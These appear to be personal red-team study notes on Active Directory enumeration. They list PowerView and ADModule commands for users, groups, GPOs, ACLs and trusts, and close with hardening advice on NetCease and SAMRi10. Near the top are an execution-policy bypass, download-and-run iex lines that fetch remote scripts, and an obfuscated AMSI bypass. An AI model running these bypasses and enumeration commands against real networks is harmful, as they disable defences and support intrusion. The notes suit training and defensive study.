[-] if you try to run script `.ps1` and get this error : `cannot be loaded because running scripts is disabled on this system`
run this command to bypass
Ps> `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`
or 
ps> `$env:PSExecutionPolicyPrefernce="bypass"`
or
Ps> `powershell -ExecutionPolicy bypass`

---
[-] shortcuts
ctrl + L > clean 

---

### Domain Enumeration

To Get Current privilages :  
`Ps> whoami /privilages`
To enumerate for current domain and forest :  

``` Powershell
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
```

---

To Speed up the process we can use [PowerView ](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)


installing PowerView can be done in multiple ways for example:
``` Powershell
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
```
NOTE : WORKED FOR Windows 7
NOTE : For Windows 10 , the AMSI blocks the installation we can bypass the AMSI by typing the following command:
``` Powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} ) 
```


And we can use [ActiveDirectory PowerShell Module](https://github.com/samratashok/ADModule) :

Installing ActiveDirectory PowerShell Module can be done in multiple ways for example:
``` Powershell
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```
NOTE : Tested for Windows 10 WORKED

---

Getting Current Domain :

```
PowerView >>> Get-NetDomain         For another Domain adding -Domain switch for example (Get-NetDomain -Domain blacktoppers.local)
ADModule  >>> Get-ADDomain          For another Domain adding -identity switch for example (Get-ADDomain -Identity blacktoppers.local)
```

Getting Current Forst :

```
PowerView  >>>  Get-NetForest
ADModule   >>>  Get-ADForest
```

Getting Domain SID :

```
PowerView  >>> Get-DomainSID
ADModule   >>> (Get-ADDomain).DomainSID           
NOTE:As it's object variable of (Get-ADDomain) Object
```
Getting Domain Policy :

```
PowerView  >>> Get-DomainPolicy
PowerView  >>> (Get-DomainPolicy)."system access"
PowerView  >>> (Get-DomainPolicy -Domain blacktoppers.local)."system access"        
ADModule   >>> Get-ADDefaultDomainPasswordPolicy
```

Getting Domain Controller :

```
PowerView  >>> Get-NetDomainController     
>>  Get-NetDomainController -Domain blacktoppers.local
ADModule   >>> Get-ADDomainController  
>>  Get-ADDomainController -DomainName blacktoppers.local -Discover  
```

Getting Domain Users :

```
PowerView  >>> Get-NetUser 
PowerView  >>> Get-NetUser -UserName cpukiller0x2
PowerView  >>> Get-NetUser | select -ExpandProperty samaccountname          
Display only names
ADModule   >>> Get-ADUser -Filter * -Properties *        
ADModule   >>> Get-ADUser -Identity cpukiller0x2 -Properties *
```

Getting User Properties:

```
PowerView  >>> Get-UserProperty                             
it displays all the properties and you can choice one of them to display as shown below

PowerView  >>> Get-UserProperty -Properties pwdlastset      
it displays last time users changed ADDefaultDomainPasswordPolicy   

PowerView  >>> Get-UserProperty -Properties whencreated     
it display when user was created 

ADModule   >>> ``` Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | Select Name ```     
it displays all user properties that can be choosed to be dipslayed spreatlly 

ADMOdule   >> ``` Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}} ```   
it displays kast time user chagned thier passwords
```

Getting Computers on Domain:
```
PowerView  >>>  Get-NetComputer                                                        Displays the list of computers

PowerView  >>>  Get-NetComputer -Ping                                                  
Displays the list of computers and performing Ping   

PowerView  >>>  Get-NetComputer -OperatingSystem "*7*"                                 Filter the results based on operating system for example containg 7 which windows 7 we can type "*10*" for windows 10 and "*server*" for windows server

PowerView  >>>  Get-NetComputer -FullData                                              Getting Full data about avaiable computers on the Domain

ADModule   >>>  Get-ADComputer -Filter * | select Name                                 Displays the list of computers

ADModule   >>>  Get-ADComputer -Filter 'OperatingSystem -like "*10*"' -Properties OperatingSystem | select Name,OperatingSystem     
Filter the results based on operating system for example containg 7 which windows 7 we can type "*10*" for windows 10 and "*server*" for windows server

AdModule   >>>  Get-ADComputer -Filter * -Properties *                                 Getting Full data about avaiable computers on the Domain     
```

Getting all the groups on the domain:

```
PowerView  >>>  Get-NetGroup                                                           Display groups

PowerView  >>>  Get-NetGroup -Domain blacktoppers.local                                Displays groups for another Domain 

PowerView  >>>  Get-NetGroup -FullData                                                 Displays all groups and it's full data

PowerView  >>>  Get-NetGroup *admin*                                                   Display all groups containing admin keyword on it's name

ADModule   >>>  Get-ADGroup -Filter * | select Name                                    Display groups

ADModule   >>>  Get-ADGroup -Filter * -Properties *                                    Displays all groups and it's full data

ADModule   >>>  Get-ADGroup -Filter 'Name -like "*admin*"' | select Name               Display all groups containing admin keyword on it's name
```

Getting More Information about sepcific users and groups:
```
PowerView  >>>  Get-NetGroupMember -GroupName "Domain Admins" -Recurse                Display all users on the Domain Admins Group

PowerView  >>>  Get-NetGroup -UserName "cpukiller"                                    
Display Group membership for user cpukiller

ADModule   >>>  Get-ADGroupMember -Identity "Domain Admins" -Recursive                
Display all users on the Domain Admins Group

ADModule   >>>  Get-ADPrincipalGroupMembership -Identity cpukiller                    Display Group membership for user cpukiller
```

Getting list of all local groups on a machine (need administrator privs on non-dc machines)

```
PowerView  >>>  Get-NetLocalGroup -ComputerName IT-1 -ListGroups                       Display all local groups on running local machine IT-1 

PowerView  >>>  Get-NetLocalGroup -ComputerName IT-1 -Recurse                          Display all members of all local groups of machine IT-1

PowerView  >>>  Get-NetLoggedon -ComputerName IT-1                                     Display all logged in users on local machine IT-1

PowerView  >>>  Get-LoggedOnLocal -ComputerName IT-1                                   Display all locally logged in users on local machine IT-1

PowerView  >>>  Get-LastLoggedOn -ComputerName IT-1                                    Display Last logged user on computer IT-1
```

Getting Share and file infromation on the Domain:

```
PowerView  >>>  Invoke-ShareFinder  or Invoke-ShareFinder -Verbose                     Display shares on hosts on current domain

PowerView  >>>  Invoke-FileFinder   or Invoke-FileFinder -Verbose                      Display senstive files on computers in the Domain

PowerView  >>>  Get-NetFileServer                                                      Display all fileservers on the domain.
```


---

Group Policy provides the ability to manage configuration and changes easily and centrally in AD.
Allow configurations of -
    Security Settings
    Registry-Based Policy Settings
    Group Policy Preferences like startup/shutdown/log-on/logoff scripts Settings
    Software Installation.
GPO can be abused for various attacks like privesc, backdoors, persistance etc..

Getting list of GPO in current Domain:
        
```
PowerView  >>>  Get-NetGPO                                                             Display list if GPO in current Domain

PowerView  >>>  Get-NetGPO -ComputerName DESKTOP-VIKMJ51.blacktoppers.local            Display list of GPO for domain computer DESKTOP-VIKMJ51.blacktoppers.local

PowerView  >>>  Get-NetGPO | select displayname                                        Display name of GPO

PowerView  >>>  Get-NetGPOGroup                                                        Display GPOS of resitricted groups

GroupPolicyModule >>>  Get-GPO -All                                                    Display all GPO on the domain

GroupPolicyModule >>>  Get-GPResultantSetOfPolicy -ReportType Html -Path  C:\Users\Administratir\report.html                       
Provide RSOP

Multi      >>>         gpresult.exe /R  /V                                             Display User Infomration RSOP
```

Getting users which are in a local group of a machine using GPO

```
PowerView  >>>  Find-GPOComputerAdmin -Computername IT-1.blacktoppers.local            Display users which are in local group of machine for ex IT-1 using GPO

PowerView  >>>  Find-GPOLocation -UserName cpukiller -Verbose                          Display all machines where user cpukiller is member of specific group using GPO
```

---

Getting OUs in domain:

```
PowerView  >>>  Get-NetOU or Get-NetOU -FullData                                       Display OUs in a domain

PowerView  >>>  Get-NetGPO -GPOname "{040afcd7-e068-4465-9023-a60d0fd91431}"           Display GPO applied on and OU using OU GUID got from Get-NETOU

PowerView  >>>  Get-NetOU -OUName StudentMachines | %{Get-NetComputer -ADSpath $_}     Display all Computers on specific OU for example StudentMachines 

PowerView  >>>  (Get-NetOU StudentMachines -FullData).gplink                           Dislay the OU gplink which will be used to list the GPO's                      

PowerView  >>>  Get-NetGPO -ADSpath  < gplink got from previous command >              Getting GPO Applied on Specifc OU using OU NAME

ADModule   >>>  Get-ADOrganizationalUnit -Filter * -Properties *                       Display OUs in a domain

GroupPolicyModule  >>>  Get-GPO -Guid 040afcd7-e068-4465-9023-a60d0fd91431             Display GPO applied on and OU using OU GUID got from Get-NETOU or Get-ADOrganizationalUnit
```

---

AD, ACLs and ACEs

As organizations become more mature and aware when it comes to cyber security, we have to dig deeper in order to escalate our privileges within an Active Directory (AD) domain. 
Enumeration is key in these kind of scenarios. Often overlooked are the Access Control Lists (ACL) in AD.An ACL is a set of rules that define which entities have which permissions on a specific AD object. 
These objects can be user accounts, groups, computer accounts, the domain itself and many more. The ACL can be configured on an individual object such as a user account, 
but can also be configured on an Organizational Unit (OU), which is like a directory within AD. The main advantage of configuring the ACL on an OU is that when configured correctly, 
all descendent objects will inherit the ACL.The ACL of the Organizational Unit (OU) wherein the objects reside, 
contains an Access Control Entry (ACE) that defines the identity and the corresponding permissions that are applied on the OU and/or descending objects.
The identity that is specified in the ACE does not necessarily need to be the user account itself; it is a common practice to apply permissions to AD security groups. 
By adding the user account as a member of this security group, the user account is granted the permissions that are configured within the ACE, because the user is a member of that security group.

Group memberships within AD are applied recursively. Let’s say that we have three groups:

  Group_A
	  Group_B
		  Group_C

Group_C is a member of Group_B which itself is a member of Group_A. When we add Bob as a member of Group_C, Bob will not only be a member of Group_C, but also be an indirect member of Group_B and Group_A. 
That means that when access to an object or a resource is granted to Group_A, Bob will also have access to that specific resource. 
This resource can be an NTFS file share, printer or an AD object, such as a user, computer, group or even the domain itself.
Providing permissions and access rights with AD security groups is a great way for maintaining and managing (access to) IT infrastructure. 
However, it may also lead to potential security risks when groups are nested too often. As written, 
a user account will inherit all permissions to resources that are set on the group of which the user is a (direct or indirect) member. If Group_A is granted access to modify the domain object in AD, 
it is quite trivial to discover that Bob inherited these permissions. However, if the user is a direct member of only 1 group and that group is indirectly a member of 50 other groups, 
it will take much more effort to discover these inherited permissions.  

So ACL enables the control on the ability of a process to access objects and other resources in AD based on
	- Access Tokens (Security context of a process - identity and  privs of user)  
	- Security Descriptors (SID of the owner of the object , Discertionary ACL (DACL) Which is list of permissions descripes who has the ability to access this object and System ACL (SACL) Audits the login into object succuss or failure)

To Recap :
	ACL : it is list of ACE(Access Control Entries) - ACE coreesponds to individual permission or audits acess. who has permission and what can be don on an object
Two Types of ACL :
		DACL : Defines the permissions trustees (a user or group) have on an object.                (Very Important for an attacker it contains list of permissions for sepcific object)
		SACL : Logs success and failure audit messages when an object is accessed.                  (Very Important for an attacker since it shows what is the audits for sepcific object and it logs what a user did on sepcfic object)
ACL are vital to security architecture of AD

Getting the ACLs Associated with specified object:
	
```
PowerView  >>>  Get-ObjectAcl -SamAccountName cpukiller -ResolveGUIDs                  Display the ACL Associated with object cpukiller 

PowerView  >>>  Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose          Get the ACLs associated with the specified prefix to be used for search

PowerView  >>>  Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins, CN=Users,DC=blacktoppers,DC=blacktoppers,DC=local" -ResolveGUIDs -Verbose          
Get the ACLs associated with the specified LDAP path to be used for search

PowerView  >>>  Invoke-ACLScanner -ResolveGUIDs                                        Search for interesting ACEs

PowerView  >>>  Get-PathAcl -Path "\\BLACKTOPPERSHQ.blacktoppers.local\sysvol"         Get the ACLs associated with the specified path

ADModule   >>>  (Get-Acl 'AD:\CN=Configuration,DC=blacktoppers,DC=local').Access       Enumerating ACLs using AD Module without resolving GUIDs
```

---

Trusts

- In an AD enviroment, trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest.
- Trust can be automatic (parent-child, same forest etc.) or established (forst,external).
- Trusted Domain Objects (TDOs) represent the trust relationships in domain.
- Trust Direction > One-wat trust - Unidirectional. Users in the trusted domain can access resources in the trusting domain but the reverse is not true
- Trust Direction > Two-way trust - Bi-directional. Users of both domains can access resources in the other domain.
- Trust Transitivity >  Transitive - Can be extended to establish trust relationships with other domains. : All the default intra-forest trust relationships (Tree-root, Parent-Child) between domains with a same forest are Transitive two-way trusts
    - For example : if Domain A trust Domain B and Domain B Trust C then Domain Domain A trust Domain C.
- Trust Nontransitive - Cannot be extended to other domains in the forest. Can be two-way or one-way. This is the default trust (called external trust) between two domains in different forests wehen forests do not have a trust relationship.

    - Domain Trusts -
        - Default/automatic Trusts
            - Parent-child trust  
                It is created automatically between the new domain and the domain that precedes it in the namespace hierarchy (subdomain of a domain/tree ), whenever a new domain is added in a tree. 
                For example : redteam.blacktoppers.local is a child of blacktoppers.local 
                This Trust is always two-way transitive.
            - Tree-root trust  
                It is created automatically between whenever a new domain tree is added to a forest root.  For example (redteam.blacktoppers.local) is domain of tree: (blacktoppers.local)
                This Trust is always two-way transitive
            - Shortcut Trusts 
                Used to reduce access times in complex trust scenarios and Joins two domains in different trees.
                This Trust can be one-way or two-way transitive. 
                As simple as that if we have domains in different trees and we want trust between two domains instead of following the trust from tree root trust we can create direct Shortcut trust between both domains.
            - External Trusts   
                Between two domains in different forests when forests do not have a trust relationship.
                This trust can be one-way or two-way and is nontransitive.  
            - Forest Trusts 
                Between forest root domain.
                Cannot be extended to a third forest (no implicit trust).
                Can be one-way or two-way and transitive or nontransitive.

Getting a list of all domain trusts
        
```
PowerView  >>>  Get-NetDomainTrust                                                     Display current domain trusts

PowerView  >>>  Get-NetDomainTrust -Domain cpukiller.redteam.blacktoppers.local        Display the trusts for sepcific domain for example the domain maybe domain we found that we can trust in bidirectonal 

ADModule   >>>  Get-ADTrust                                                            Display current domain trusts

ADModule   >>>  Get-ADTrust -Identity cpukiller.redteam.blacktoppers.local             Display the trusts for sepcific domain for example the domain maybe domain we found that we can trust in bidirectonal
```

Getting Details about current forest

```
PowerView  >>>  Get-NetForest                                                          Display Current Forest

PowerView  >>>  Get-NetForest -Forest blacktoppers.local                               Display Details for specified Forest

ADModule   >>>  Get-ADForest                                                           Display Current Forest

ADModule   >>>  Get-ADForest -Identity blacktoppers.local
```

Getting all domains in the current forest

```
PowerView >>> Get-NetForestDomain                                                      Display all domains in current forest

PowerView >>> Get-NetForestDomain -Forest blacktoppers.local                           Display all domains in blacktoppers.local forest

AD-Module >>> (Get-ADForest).Domains                                                   Display all domains in current forest
```

Getting all global catalogs of forest           The Global Catalog is a namespace that contains directory data for all domains in a forest. The Global Catalog contains a partial replica of every domain directory. It contains an entry for every object in the enterprise forest, but does not contain all the properties of each object. Instead, it contains only the properties specified for inclusion in the Global Catalog.

```
PowerView  >>> Get-NetForestCatalog                                                    Display all global catalogs of current forest

PowerView  >>> Get-NetForestCatalog -Forest blacktoppers.local                         Display all global catalogs of specific forest

AD-Module  >>> Get-ADForest select -ExpandProperty GlobalCatalogs                      Display all global catalogs of current forest
```

Getting Details about trusts of a forest

```
PowerView  >>>  Get-NetForestTrust                                                     Map trusts of current forest

Powerview  >>>  Get-NetForestTrust -Forest blacktoppers.local                          Map trusts of specifc forest for example forest you trust External (having such trust you can enuermate all users on the other forest computers etc..)

AD-Module  >>>  Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'            Map trusts of current forest
```

---

User Hunting  (Hunt for sepcific users interesting users) Noise Enumeration

```
PowerView  >>> Find-LocalAdminAccess -Verbose                                          Find all machines on the current domain where the current user has local admin access

Powerview  >>> Invoke-CheckLocalAdminAccess                                            This function queries the DC of the current or provided domain for a list of computers ( Get NetComputer ) and then use multi threaded Invoke CheckLocalAdminAccess on each machine.                                                                      

PowerView  >>> Invoke-EnumerateLocalAdmin                                              Find local admins on all machines of the domain (needs administrator privs on non dc machines).This function queries the DC of the current or provided domain for a list of computers ( Get NetComputer ) and then use multi threaded Get NetLocalGroup on each machine. (Noisy)

PowerView  >>> Invoke-UserHunter                                                       Find computers where a domain admin (or specified user/group) has sessions This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get NetGroupMember , gets a list ofcomputers ( Get-NetComputer ) and list sessions and logged on users Get-NetSession Get-NetLoggedon ) from each machine   (Noisy)  

PowerView  >>> Invoke-UserHunter -GroupName "RDPUsers"                                 Find computers where a domain admin (or specified user/group) has sessions

PowerView  >>> Invoke-UserHunter -CheckAccess                                          Confirming admin access

PowerView  >>> Invoke-UserHunter -Stealth                                              Find Computers where domain admin is logged-in  Stealth only request to high traffic servers so it's little noisy , This option queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get NetGroupMember , gets a list _only_ of high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation and list sessions and logged on users ( Get-NetSession Get-NetLoggedon ) from each machine.

Seperate   >>> .\Find-WMILocalAdminAccess.ps1                                          Find all machines on the current domain where the current user has local admin access if RPC and SMB are blocked     Extremely (Noisy)
```

-------------

More Important User Enumeartion

To enumerate members of the Enterprise Admins group:
PS C:\AD\Tools> `Get-NetGroupMember -GroupName "Enterprise Admins"`
Since, this is not a root domain, the above command will return nothing. We need to query the root domain as Enterprise Admins group is present only in the root of a forest.
PS C:\AD\Tools> `Get-NetGroupMember -GroupName "Enterprise Admins" –Domain moneycorp.local`
_______________________________________________________

Defending Against Active Directory Enumeration

- Most of the enumeration mixes really well with the normal traffic to the DC.  (Cannot be Protected because it's normal behaivour)
- Hardening can be done on the DC (or other machines) to contain the information provided by the queried machine.
- However we can defend against one of the most lethal enumeration techniques: user hunting.
- Netcease is a script which changes permissions on the NetSessionEnum method by removing permission for Authenticated Users group.
- This fails many of the attacker's session enumeration and hence user hunting capabilities. .\NetCease.ps1 
- Another interesting script from the same author is SAMRi10 which hardens Windows 10 and Server 2016 against enumeration which uses SAMR protocol (like net.exe)
- https://gallery.technet.microsoft.com/SAMRi10-Hardening-Remote-48d94b5b
- https://gallery.technet.microsoft.com/Net-Cease-Blocking-Net-1e8dcb5b
- After Downloading NetCease.ps1 run it on the DC .\NetCease.ps1 Then restart server service by typing (Restart-Service -Name Server -Force) now no user can query Get-NetSession
- To disable NetCease type (.\NetCease.ps1 -Revert) Then restart server service by typing (Restart-Service -Name Server -Force)